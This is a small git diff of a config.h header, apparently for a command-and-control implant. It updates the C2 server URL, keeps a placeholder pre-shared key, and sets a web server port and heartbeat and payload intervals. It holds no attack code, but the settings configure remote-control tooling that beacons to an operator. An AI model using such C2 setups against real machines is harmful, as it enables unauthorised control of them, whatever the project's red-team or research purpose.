@@ -1,8 +1,12 @@
+// if you see this, that means i forgot properly add this in .gitignore
+
 #ifndef CONFIG_H
 #define CONFIG_H
 
-#define C2_URL     "http://10.207.186.89:8000" // Change this to your C2 server URL
+#define C2_URL     "http://10.132.229.89:8000" // Change this to your C2 server URL
 #define PSK        "supersecret32bytekeygoeshere123456"  // 32 bytes
+
+#define WEBSERVER_PORT 8080
 
 #define HEARTBEAT_INTERVAL 15   // Heartbeat interval in seconds
 #define PAYLOAD_INTERVAL   30  // Payload interval in seconds
